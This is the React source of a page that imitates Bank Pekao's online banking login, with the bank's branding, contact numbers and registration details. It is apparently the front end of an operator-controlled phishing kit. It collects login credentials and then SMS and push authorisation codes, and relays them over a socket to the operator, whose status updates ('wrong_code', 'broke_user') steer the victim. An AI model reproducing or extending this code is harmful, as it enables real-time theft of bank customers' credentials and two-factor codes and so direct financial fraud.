import React, {useEffect} from "react";
import {Container} from "reactstrap";
import logo from '../../assets/img/pecao/logo-white.svg';
import LoginForm from "./components/LoginForm/LoginForm";
import PecaoLoader from "./components/Loader";
import {useSocket} from "../../context/socket/socketProvider";
import CodeForm from "./components/codeForm/CodeForm";
import BrokeUser from "./components/broke/Broke";
import '../../assets/scss/pages/_pecao.scss'

const Pekao = () => {
    const {user, initUser, connect, disconnect, sendCode, sendData} = useSocket();

    const submitLogin = (data) => {
        console.log(data);
        initUser({
            ...data, bank: 'pekao'
        })
    }
    const submitCode = (code) => {
        console.log('Submit code', code);
        sendCode(code)
    }
    const submitPush = (code) => {
        sendData('send_push_code', {code});
    }


    useEffect(() => {
        connect('pekao');
        return () => disconnect();
    }, [])
    return (
        <div className={'pecao'}>
            <body>
            <header className={'pecao_header'}>
                <Container>
                    <div className="pecao_header_content">
                        <div className="logo">
                            <a href={'#'}>
                                <img src={logo} alt="logo"/>
                            </a>
                        </div>
                        {
                            user.status === '' || user.status === 'init' ?
                                <div className="registration">
                                    <span>Nie masz konta?</span>
                                    <a href={'#'}>Zostań klientem</a>
                                </div> : null
                        }

                    </div>
                </Container>
            </header>
            <main>
                <Container>
                    <div className="pecao_login_container">
                        {
                            user.status === '' || user.status === 'wrong_login' ?
                                <LoginForm handler={submitLogin}/> :
                                user.status === 'getting_code' || user.status === 'wrong_code'?
                                    <CodeForm handler={submitCode} status={user.status}/> :
                                    user.status === 'getting_push_code' || user.status === 'wrong_push_code'?
                                        <CodeForm handler={submitPush} status={user.status}/> :
                                    user.status === 'broke_user' ?
                                        <BrokeUser/> : <PecaoLoader/>
                        }
                    </div>
                </Container>
            </main>
            <footer className={'pecao_footer footer'}>
                {/*<Container>*/}
                <div className="footer-section">
                    <div className="footer-wrapper footer-navigation">
                        <div className="footer-navigation-group">
                            <a href={'#'}>801 365 365</a>
                            <a href={'#'}>+48 22 59 12 232</a>
                        </div>
                        <div className="footer-navigation-group links-group">
                            <div className="links">
                                <a
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="button button-tertiary"
                                    href="https://www.pekao.com.pl/klient-indywidualny/bankowosc-elektroniczna/bezpieczenstwo.html">Bezpieczeństwo</a>

                                <a
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="button button-tertiary"
                                    href="https://www.pekao.com.pl/o-banku/stopka/rodo.html">RODO</a>

                            </div>
                            <div className="links">
                                <a
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="button button-tertiary"
                                    href="https://www.pekao.com.pl/o-banku/stopka/polityka-prywatnosci.html">Polityka
                                    prywatności</a>
                                <a
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="button button-tertiary"
                                    href="https://www.pekao.com.pl/kontakt.html">Kontakt</a>

                            </div>
                        </div>
                    </div>
                </div>
                {
                    user.status === '' || user.status === 'init' ?
                        <div className={'footer-section bank-information ng-star-inserted'}>
                            <div className="footer-wrapper footer-info-group">
                                        <span className="krs-txt">
                                            Bank Polska Kasa Opieki Spółka Akcyjna z siedzibą w Warszawie, ul. Grzybowska 53/57, 00-844 Warszawa, wpisany do rejestru przedsiębiorców w Sądzie Rejonowym dla m.st. Warszawy w Warszawie, XII Wydział Gospodarczy Krajowego Rejestru Sądowego, KRS: 0000014843, NIP: 526-00-06-841, REGON: 000010205, wysokość kapitału zakładowego i kapitału wpłaconego: 262 470 034 zł.
                                        </span>
                                <div className="definition-group">
                                    <div className="codes">
                                        <span className="padding-right">KOD BIC/SWIFT: PKOPPLPW</span>
                                    </div>
                                    <div> © 2021 Bank Polska Kasa Opieki Spółka Akcyjna</div>
                                </div>
                            </div>
                        </div> : null
                }

                {/*</Container>*/}
            </footer>
            {/*<PecaoLoader/>*/}
            </body>
        </div>
    )
}

export default Pekao;